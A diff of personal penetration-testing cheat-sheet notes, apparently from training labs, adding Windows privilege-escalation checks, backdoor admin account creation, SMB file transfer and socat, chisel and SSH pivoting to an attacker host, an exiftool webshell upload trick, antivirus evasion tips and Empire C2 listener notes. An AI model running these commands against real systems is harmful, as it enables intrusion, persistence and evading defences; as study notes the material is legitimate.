@@ -42,6 +42,7 @@
     - [Macros](#macros)
   - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
 - [Usefull Windows commands](#usefull-windows-commands)
+  - [Stabilize and Post Exploit windows](#stabilize-and-post-exploit-windows)
 - [wireless](#wireless)
   - [aircrack-ng tools](#aircrack-ng-tools)
   - [steps](#steps-1)
@@ -58,18 +59,19 @@
     - [maintaining access](#maintaining-access)
 - [Network assessment](#network-assessment)
   - [Steps](#steps-2)
-  - [pivot:](#pivot)
-    - [ssh](#ssh)
-    - [plink.exe](#plinkexe)
-    - [socat](#socat)
-    - [Chisel](#chisel)
-    - [sshutle](#sshutle)
-    - [proxy](#proxy)
+  - [PIVOTING](#pivoting)
+    - [SSH](#ssh)
+    - [PLINK.EXE](#plinkexe)
+    - [SOCAT](#socat)
+    - [CHISEL](#chisel)
+    - [SSHUTTLE](#sshuttle)
+    - [PROXY](#proxy)
   - [GIt enumeration](#git-enumeration)
-    - [Stabilize and Post Exploit windows](#stabilize-and-post-exploit-windows)
-    - [Command and Control](#command-and-control)
-      - [Empire (windows) / Starkiller](#empire-windows--starkiller)
-        - [Hop Listener](#hop-listener)
+- [Antivirus Evasion](#antivirus-evasion)
+  - [Cross compilation](#cross-compilation)
+  - [How AV Works](#how-av-works)
+- [Empire (windows) / Starkiller](#empire-windows--starkiller)
+  - [Hop Listener](#hop-listener)
 
 
 # Net Sec
@@ -169,6 +171,10 @@
 - Option 2 - copy source
   1. Copy code from source and past in the target + save .sh
   2. make executable: chmod +x file.ext
+- option 3 - smbserver
+  -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+  -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
+  -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
 
 # Working with executables
 
@@ -307,6 +313,9 @@ Insecure Direct Object Request
 
 - null byte = %00, injection (terminate string)
 - curl -X METHOD -d [data]
+- magic numbers
+- double extension
+- exiftools -Comment=PAYLOAD picture.jgp.php ==> Comments!!!
 
 ## SSRF
 - Server-Side Request Forgery
@@ -510,6 +519,26 @@ admin123' UNION SELECT SLEEP(5),2;--
 - Windows: get file 
 - powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
 - powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"
+- whoami /priv = privileges in windows
+- whoami / groups
+- wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+  - find services not in folder c:\windows
+  - find services without quotation marks
+  - account for the service: sc qc SERVICE_NAME ==>local syste?
+
+
+- check permision
+  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
+
+
+
+- 
+  
+## Stabilize and Post Exploit windows
+- Create user + add group admin
+  - net user USERNAME PASS /add
+  - net localgroup Administrators Username /add
+
 
 # wireless
 - SSID: network name
@@ -648,17 +677,19 @@ admin123' UNION SELECT SLEEP(5),2;--
 - Enumerate
 - Find everything that there is outside and inside
 - find services running, find cve for these services
-- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding
+- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding, socat, sshuttle
 - get ssh key if they are available
+- upload/download files
 
-## pivot:
+## PIVOTING
 -  from on machine to another
 -  tunnelling/proxying: route all traffic (a lot of traffic)
 -  port forwarding: create connection (few ports)
 -  ProxyChain
--  firewall-cmd --zone=public --add-port PORT/tcp
+- (linux) firewall-cmd --zone=public --add-port PORT/tcp
+- (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
 
-### ssh
+### SSH
 - Port Forwarding
   - ssh -L [myport]:target:[open_port_target] user@[public_ip] -fN
 - Proxy
@@ -669,12 +700,31 @@ admin123' UNION SELECT SLEEP(5),2;--
   - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
   - executing on we habe the shell
 
-### plink.exe
+
+
+- -L ==> Port FOrwarding
+  - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
+  - access FIRST through SECOND, 8000 is local port
+    - -f = background
+    - -N no command execution
+
+- -D [PORT] ==> Proxy
+  - open port on attacking
+-Reverse Connections
+  - generate ssh key
+  - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
+  - restart ssh
+  - transfer private key to target: 
+  - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+  - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+
+### PLINK.EXE
 - command line for putty
 - cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
 - convert key with puttygen: puttygen key -o xxx.ppk
 
-### socat
+### SOCAT
 - Reverse shell
   - listener on the attacker
   - relay on compromised: ./socat tcp-l:8000 tcp:Attacker-IP:443 &
@@ -698,25 +748,35 @@ admin123' UNION SELECT SLEEP(5),2;--
  close all:
   - jobs ==> find socats processes 
   
-### Chisel
+### CHISEL
 - set up tunnel proxy / port forward
+  
 - client / server 
+  
 - Reverse SOCKS Proxy
   - server: chisel server -p [port] --reverse &
   - client (victim0): ./chisel client [attacker]:8005 R:socks &
     - R = remote, client knows that server antecipate proxy
+- 
 - Forward SOCK Proxy
   - victim: ./chisel server -p LISTEN_PORT --socks5
   - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+  
 - Port Forward
   - attacker: ./chisel server -p LISTEN_PORT --reverse &
   - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
   - victim to our machine: ./chisel server -p 1337 --reverse &
+  
 - Local Port Forward
   - compromised: ./chisel server -p LISTEN_PORT
   - attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
 
-### sshutle
+- In the machine with evil-win open firewall port
+  - cd w
+  - chisel client => attacking
+  - chisel server => victim
+
+### SSHUTTLE
 - easier to handle
 - only linzx
 - need ssh access to public interface
@@ -727,9 +787,9 @@ admin123' UNION SELECT SLEEP(5),2;--
   - -x exclude compromised server
 - Direct access to evil-winrM
   - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
-
-
-### proxy
+-Reset resolved.service: sudo systemctl restart systemd-resolved.service
+ 
+### PROXY
 - proxychains
   - open port in our system linked to target
   - proxychains COMMAND [host] [port] / own conf file proxychains.conf
@@ -738,24 +798,6 @@ admin123' UNION SELECT SLEEP(5),2;--
   
 - FoxyProxy
   - better for web
-
-- ssh
-  - -L ==> Port FOrwarding
-    - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
-      - access FIRST through SECOND, 8000 is local port
-      - -f = background
-      - -N no command execution
-  
-  - -D [PORT] ==> Proxy
-    - open port on attacking
-  
-  - Reverse Connections
-    - generate ssh key
-    - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
-    - restart ssh
-    - transfer private key to target: 
-      - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
-      - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
 
 ## GIt enumeration
 - nmap -sn ip.1-255 -oN output
@@ -767,17 +809,49 @@ admin123' UNION SELECT SLEEP(5),2;--
 - execute shell there
 - execute with burp or curl
 - curl -POST localhost:8000 ==> here we go to the computer we dont have access
-
-
-### Stabilize and Post Exploit windows
-- Create user + add group admin
-  - net user USERNAME PASS /add
-  - net localgroup Administrators Username /add
-
-### Command and Control
-- Consolidate attack + simplifiy post exploitation
   
-#### Empire (windows) / Starkiller
+- Extract .git folder
+- Gittools
+  - dumper: downlaod exposed .git directory from site
+  - extractor: take local .git and recreate repository
+  - finder: search for exposed g.t
+  - Read files: 
+    - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+
+
+# Antivirus Evasion
+- Fundamentals
+- 2 types
+  - on-disk
+    - execute on target
+  - in memory
+    - import into memory and execute. Not save in the disk
+  
+- Identify AV
+  - Seatbelt
+  - SharpEDRChecker
+  - disable cloud-based protection: test our payload
+  
+- Obfuscate payload
+  - encode string
+  - split parts
+  - https://www.gaijin.at/en/tools/php-obfuscator
+
+
+## Cross compilation
+- run programs in different platforms
+
+
+## How AV Works
+- Static
+  - signature detection
+  - byte matching: find matching sequences in the file
+- Dynamic / Heuristic / Behavioural
+  - line by line execution
+  - pre-defined rules
+  - no gan, no gui + VM = sandbox
+
+# Empire (windows) / Starkiller
 - powershell-empire server + client
   - different location:
     - /usr/share/powershell-empire/empire/client/config.yaml
@@ -803,11 +877,10 @@ admin123' UNION SELECT SLEEP(5),2;--
 - Starkiller
   - GUI
 
-##### Hop Listener
+## Hop Listener
 - noo connection forwarding
 - create files copied across compromised to target = reference back to our listener
 - Every connection happens with the compromised who sends to the target
-
 
 - listener [http_hop]
   - .php files that need to be sent to compromised
@@ -822,9 +895,3 @@ admin123' UNION SELECT SLEEP(5),2;--
   - open port firewall
   - make sure we have the access to the target
   - use module to escalate privilege
-
-
-  - In the machine with evil-win open firewall port
-    - cd w
-    - chisel client => attacking
-    - chisel server => victim
